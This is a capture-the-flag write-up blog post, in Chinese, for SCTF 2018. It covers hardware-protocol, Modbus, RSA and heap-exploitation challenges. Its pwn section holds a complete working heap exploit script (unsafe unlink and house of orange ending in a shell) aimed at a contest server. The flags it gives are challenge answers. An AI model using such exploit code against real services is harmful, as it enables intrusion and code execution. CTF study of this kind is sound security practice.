<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="SCTF 2018 Writeup">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>SCTF 2018 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2018/06/22/SCTF2018/">
                SCTF 2018 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-06-22</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="De1ta-Team"><a href="#De1ta-Team" class="headerlink" title=" De1ta-Team"></a> <strong>De1ta-Team</strong></h1><a id="more"></a>
<blockquote>
<p>Team：De1ta</p>
</blockquote>
<p>[TOC]</p>
<h1 id="0x00-Misc"><a href="#0x00-Misc" class="headerlink" title="0x00 Misc"></a>0x00 Misc</h1><h2 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h2><p>参考资料：<br><a href="https://bbs.pediy.com/thread-151259-1.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-151259-1.htm</a><br><a href="https://www.waitalone.cn/security-hardware-usb.html" target="_blank" rel="noopener">https://www.waitalone.cn/security-hardware-usb.html</a><br>下载Saleae Logic 分析软件分析截获的logicdata数据包：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171308-7aa31c78-75fc-1.png" alt></p>
<p>clk栏为时钟电平，data栏为数据电平。<br>每个指令都在时钟高电平时数据下降沿后开始，数据从低位到高位的顺序发送。发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据，然后时钟高电平数据电平上升沿代表本次命令结束。我们关注的指令类型为0x33，用于校验口令。发送命令格式为<br><code>0x33 0x01 s1</code><br><code>0x33 0x02 s2</code><br><code>0x33 0x03 s3</code><br>其中s1 s2 s3拼在一起就是那三个字节的口令了.<br>在下图方框部分可以找到校验口令：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171308-7abb46ea-75fc-1.png" alt></p>
<p>放大后三条命令分别为：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171308-7ae3483e-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b008f8e-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b23c526-75fc-1.png" alt></p>
<p>在时钟电平为高电平时对应的数据电平高低位分别表示1和0，且数据按从低位到高位的顺序发送，因此三调指令分别为：<br>0x33 0x01 0x40<br>0x33 0x02 0x31<br>0x33 0x03 0x10<br>因此三个口令为 0x40 0x31 0x10</p>
<blockquote>
<p><code>flag：SCTF{403110}</code></p>
</blockquote>
<h2 id="神奇的modbus"><a href="#神奇的modbus" class="headerlink" title="神奇的modbus"></a>神奇的modbus</h2><p>拿到数据包，输入modbus过滤</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b3f8784-75fc-1.png" alt></p>
<p>随便点一个，追踪tcp流，得到flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b54426e-75fc-1.png" alt></p>
<blockquote>
<p><code>flag:sctf{Easy_Mdbus}</code></p>
</blockquote>
<h2 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h2><p>拿到swf文件，先扔到IE里玩了一下，没有什么特别的发现<br>游戏难度较高，通关遥遥无期<br>于是，直接用爱奇艺播放器打开，在第57帧可以看到通关的NPC对话</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b8071e0-75fc-1.png" alt></p>
<p>得到一串base64</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7b93f904-75fc-1.png" alt></p>
<blockquote>
<p><code>flag:SYC{F3iZhai_ku4ile_T111}</code></p>
</blockquote>
<h2 id="被动了手脚的数据"><a href="#被动了手脚的数据" class="headerlink" title="被动了手脚的数据"></a>被动了手脚的数据</h2><p>题目提示了数据，这里使用了一款工具modbus-cli（<a href="https://github.com/tallakt/modbus-cli" target="_blank" rel="noopener">https://github.com/tallakt/modbus-cli</a> ）接收modbus协议的数据。用法如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7ba99eda-75fc-1.png" alt></p>
<p>这里尝试读取1000字节的数据，由于每次读取数据长度太长会导致timeout，因此每次只读取50字节，写个脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">start=400001</span><br><span class="line">offset=50</span><br><span class="line"><span class="keyword">for</span> ((i=<span class="variable">$start</span>; i&lt;=400001+1000; i+=50))  </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	modbus <span class="built_in">read</span> --modicon 116.62.123.67 <span class="variable">$i</span> <span class="variable">$offset</span></span><br><span class="line">	sleep 1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>在跑出来的结果中，发现在400300-400331地址间有一段可疑数据：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7bbd49da-75fc-1.png" alt></p>
<p>把数据提取出来，转hex转ascii：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">21810</span>, <span class="number">18035</span>, <span class="number">25671</span>, <span class="number">22123</span>, <span class="number">22577</span>, <span class="number">11092</span>, <span class="number">26979</span>, <span class="number">26482</span>, <span class="number">22117</span>, <span class="number">18758</span>, <span class="number">14640</span>, <span class="number">18761</span>, <span class="number">30789</span>, <span class="number">28503</span>, <span class="number">12912</span>, <span class="number">28789</span>, <span class="number">13161</span>, <span class="number">12151</span>, <span class="number">26946</span>, <span class="number">13638</span>, <span class="number">30073</span>, <span class="number">26177</span>, <span class="number">29764</span>, <span class="number">29293</span>, <span class="number">11064</span>, <span class="number">31308</span>, <span class="number">21879</span>, <span class="number">27205</span>, <span class="number">20314</span>, <span class="number">13876</span>, <span class="number">26178</span>, <span class="number">13162</span>] </span><br><span class="line"><span class="keyword">print</span> len(data) flag=<span class="string">""</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)): 	</span><br><span class="line">    flag+=hex(data[i])[<span class="number">2</span>:].decode(<span class="string">'hex'</span>) </span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment">#U2FsdGVkX1+TicgrVeIF90IIxEoW2ppu3i/wiB5FuyfAtDrm+8zLUwjEOZ64fB3j</span></span><br></pre></td></tr></table></figure>
<p>得到字符串U2FsdGVkX1+TicgrVeIF90IIxEoW2ppu3i/wiB5FuyfAtDrm+8zLUwjEOZ64fB3j，由U2Fsd特征易知是AES加密的密文，使用解密网站，密钥为空，解得flag：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7bcdaf3c-75fc-1.png" alt></p>
<blockquote>
<p>flag：sctf{S_y3L_0v6:M_0_dbus}</p>
</blockquote>
<h2 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h2><p>从代码可以看出，当ki等于1时，需要多执行一步R←R+P，因此时间和功耗都会增加：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7bdb9f48-75fc-1.png" alt></p>
<p>因此1 0 对应关系如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7c0c01f6-75fc-1.png" alt></p>
<blockquote>
<p><code>flag:SCTF{0110111010}</code></p>
</blockquote>
<h2 id="交易识破后的报复"><a href="#交易识破后的报复" class="headerlink" title="交易识破后的报复"></a>交易识破后的报复</h2><p>这题是赛后才解出来的orz</p>
<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h4><blockquote>
<p>根据IC卡中嵌入的集成电路的不同可以分为三类：存储器卡、逻辑加密卡、CPU卡。其中逻辑加密卡是功能介于存储器卡和CPU卡之间，逻辑加密卡主要是由EEPROM单元阵列和密码控制逻辑组成。根据统计资料分析，逻辑加密卡在应用中所占的比例是最高的。</p>
<p>SLE4428是SIMENS公司设计的逻辑加密IC卡, 容量为1K x 8Bit, 设有两个字节的密码. 只有通过了密码验证, 才可以对IC卡内的没有设置写/擦除保护的内容进行写/擦除. 内部有错误计数器(EC), 错误计数器总是可以被写的, 如果连续8次校验密码不成功, IC卡将自动被锁死, 数据只能读出, 不可再校验密码. 每个字节都可以单独的设置写/擦除保护, 一旦设置了写/擦除保护, 这个字节的数据就不能再写/擦除了, 而且写保护功能只能设置一次. 除了密码区, 其他所有字节在任何时候都可以读出来.    (引自: &lt;逻辑加密IC卡SLE4428介绍及其应用&gt;[张元良/杨加林])</p>
<p>下图是卡的引脚及对应的功能:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7c22a1c2-75fc-1.png" alt></p>
<p>内部结构图如下:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c3b7792-75fc-1.png" alt></p>
</blockquote>
<h4 id="0x01-4428协议介绍"><a href="#0x01-4428协议介绍" class="headerlink" title="0x01 4428协议介绍"></a>0x01 4428协议介绍</h4><blockquote>
<p><strong>SLE4428信协议：</strong></p>
<p>数据传输协议是指连接IFD器件和IC之间接口的协议。在I/O的所有数据的变化是由CLK的下降沿上确定的。</p>
<p>数据传递协议由四个模式组成：</p>
<ul>
<li><p>复位并应答复位</p>
</li>
<li><p>命令模式</p>
</li>
<li><p>数据输出模式</p>
</li>
<li><p>处理模式</p>
</li>
</ul>
</blockquote>
<h5 id="1-1-复位并应答复位"><a href="#1-1-复位并应答复位" class="headerlink" title="1.1 复位并应答复位"></a>1.1 复位并应答复位</h5><p>​    当给IC卡上电后，IC卡进人上电复位(POR)状态，上电复位状态由复位操作停止，复位由RST引脚从0变为1开始，CLK由0变为1结束，复位操作将使IC卡放弃当前执行的命令. 当IC卡复位后，必须进行一次读操作. 如下图复位操作的时序图:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c4ebf1e-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c6128c0-75fc-1.png" alt></p>
<p>复位应答使Ic卡内部的地址计数器归零, 并且第一个数据位出现在I／O上. 然后再输人31个脉冲, 读出31位数据.</p>
<blockquote>
<p>这段数据一般在最开始, 对密码分析暂无价值.</p>
</blockquote>
<h5 id="1-2-命令模式"><a href="#1-2-命令模式" class="headerlink" title="1.2 命令模式"></a>1.2 命令模式</h5><p>​    SLE4428 IC卡的命令模式(命令输入)是当RST置高电平时, 相反, 当RST置低电平时为数据输出. 相较于复位模式, RST置高电平时间要长很多, 一般为三个字节的时间. 如下图:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c6f687c-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c815654-75fc-1.png" alt></p>
<table>
<thead>
<tr>
<th>RST</th>
<th>I/O</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Command entry(命令输入)</td>
</tr>
<tr>
<td>0</td>
<td>Data output(数据输出)</td>
</tr>
</tbody>
</table>
<p>​    SLE4428总共有8种命令模式, 如下图:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c8c7c3c-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7c97b8fe-75fc-1.png" alt></p>
<blockquote>
<p>如上面两图, 解释如下:</p>
<ul>
<li>Byte 1的低6位(S0 - S5)是执行的操作, 高二位(A8 - A9)是地址位(目的地址)的高二位.</li>
<li>Byte 2的8位(A0 - A7)是目的地址的低8位, 所以目的地址位总共有: (A0 - A9) 10位.</li>
<li>Byte 3的8位(D0 - D7)是数据位. 当要向IC卡写数据的时候(100011 / 110011 / 000011 / 010011), 这个字节就是要写入的数据. 当IC卡读数据的时候(001100 / 011100 / 101100), 这个地址无效.</li>
<li><strong>注意</strong>: 读时序图的时候, 要注意是小端模式.</li>
</ul>
</blockquote>
<h3 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h3><h4 id="密码校验"><a href="#密码校验" class="headerlink" title="密码校验"></a>密码校验</h4><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7cadbf3c-75fc-1.png" alt></p>
<p>​    题目种提到了改了用户密码, 并修改了金额, 如果是要写数据, 就必须先校验密码, 否则只能读取卡中的部分内容, 更加无法修改数据. SLE4428校验过程如下:</p>
<ol>
<li><p>写错误计数器中没有被写过的一位:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171311-7cbcb5be-75fc-1.png" alt></p>
</li>
<li><p>分别输入(10110011)第一个/第二个校验码, <strong>可得密码是(0512)</strong> :</p>
</li>
</ol>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7ccb7ec8-75fc-1.png" alt></p>
<ol start="3">
<li><p>校验通过后,擦除错误计数器EC(在该数据中没找到, 倒是有个不带保护位的读操作011100, 估计是先读EC, 若错误计数器为0就不擦除, 否则就要擦除.)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7cdf79fa-75fc-1.png" alt></p>
</li>
</ol>
<h4 id="写-擦除数据"><a href="#写-擦除数据" class="headerlink" title="写/擦除数据"></a>写/擦除数据</h4><p>​    密码校验通过之后, 便可以进行写/擦除数据的操作. 向IC卡写数据时(写0), 是对IC卡存储区的一个字节的某些位进行写. 向IC卡擦除数据时(写1), 是对IC卡存储区的整个字节进行擦除操作. 下面两图是写/擦除数据操作, 题目修改数据部分, 就是在这里. 这里总共有16次写/擦除操作, 每次操作取相应的目的地址(Byte 2)和数据(Byte 3), 即得到全部flag.</p>
<blockquote>
<p>Address: 80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F</p>
<p>Data: FF F6 05 72 FF FF FF FF FF FF FF FF FF FF FF FF</p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7ced22e4-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7cfba530-75fc-1.png" alt></p>
<p>至此可得flag:</p>
<blockquote>
<p><code>flag:sctf{0512+808182838485868788898A8B8C8D8E8F+FFF60572FFFFFFFFFFFFFFFFFFFFFFFF}</code></p>
</blockquote>
<h1 id="0x01-Crypto"><a href="#0x01-Crypto" class="headerlink" title="0x01 Crypto"></a>0x01 Crypto</h1><h2 id="it-may-contain-‘flag’"><a href="#it-may-contain-‘flag’" class="headerlink" title="it may contain ‘flag’"></a>it may contain ‘flag’</h2><p>e非常大，导致d会很小，使用低解密指数攻击。借助工具(<a href="https://github.com/pablocelayes/rsa-wiener-attack/blob/master/RSAwienerHacker.py)求得d=731297.则msg=38321129004205530330779911668681589489034853148078444，INT转ASCII得到flag1sH3r3_d_ist0sma1l" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack/blob/master/RSAwienerHacker.py)求得d=731297.则msg=38321129004205530330779911668681589489034853148078444，INT转ASCII得到flag1sH3r3_d_ist0sma1l</a></p>
<blockquote>
<p>flag：SCTF{flag1sH3r3_d_ist0sma1l}</p>
</blockquote>
<h1 id="0x02-Pwn"><a href="#0x02-Pwn" class="headerlink" title="0x02 Pwn"></a>0x02 Pwn</h1><h2 id="bufoverflow-a"><a href="#bufoverflow-a" class="headerlink" title="bufoverflow_a"></a>bufoverflow_a</h2><p>首先leak出libc基址，然后构造large bin 来leak出堆地址，尝试过unsafe unlink……<br>然而它delete完会置0………..感觉还是要house of orange……..<br>下面是payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">'./bufoverflow_a'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'116.62.152.176'</span>,<span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(sz)</span>:</span></span><br><span class="line">	se(<span class="string">'1\n'</span>)</span><br><span class="line">	ru(<span class="string">'Size: '</span>)</span><br><span class="line">	se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	se(<span class="string">'2\n'</span>)</span><br><span class="line">	ru(<span class="string">'Index: '</span>)</span><br><span class="line">	se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(content)</span>:</span></span><br><span class="line">	se(<span class="string">'3\n'</span>)</span><br><span class="line">	ru(<span class="string">'Content: '</span>)</span><br><span class="line">	se(content)</span><br><span class="line">	ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	se(<span class="string">'4\n'</span>)</span><br><span class="line">	data=ru(<span class="string">'1. Alloc'</span>)</span><br><span class="line">	ru(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------leak libc base ---------------</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">libc=u64(show()[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">base=libc<span class="number">-0x399B58</span></span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment">#clear</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak heap base------------------------</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">alloc(<span class="number">0x1000</span>)</span><br><span class="line">alloc(<span class="number">0x500</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x98</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap=u64(show()[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0xb0</span></span><br><span class="line">haddr=heap+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------unsafe unlink-------</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line">alloc(<span class="number">0xf8</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">fill(p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(haddr<span class="number">-0x18</span>)+p64(haddr<span class="number">-0x10</span>)+<span class="string">'a'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x1f8</span>)</span><br><span class="line">fill(p64(<span class="number">0x41</span>)*<span class="number">0x3e</span>+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x218</span>)</span><br><span class="line">fill(<span class="string">'a'</span>*<span class="number">0x118</span>+p64(<span class="number">0x91</span>)+(p64(<span class="number">0x21</span>)*<span class="number">24</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_list_all_addr = base + e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = base + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x218</span>)</span><br><span class="line">file_struct=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(libc)+p64(io_list_all_addr - <span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">file_struct += p64(jump_table_addr)</span><br><span class="line">file_struct += p64(base + <span class="number">0x3f52a</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fill(<span class="string">'a'</span>*<span class="number">0x110</span>+file_struct+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base+<span class="number">0x3f52a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:SCTF{0Ne_Nu11_8y7e_c4n_p1ck_up_7he_e@r7h}</code></p>
</blockquote>
<h2 id="sbbs"><a href="#sbbs" class="headerlink" title="sbbs"></a>sbbs</h2><p>login处有溢出，可以在任意地方赋值admin .clientele<br>利用这个可以扩大某个被free的unsorted bin，然后控制后面的chunk</p>
<p>到这里的话如果给了libc，可以按照上一题的做法，house of orange</p>
<p>这里靠报错信息来找libc</p>
<p>找到是2.23的</p>
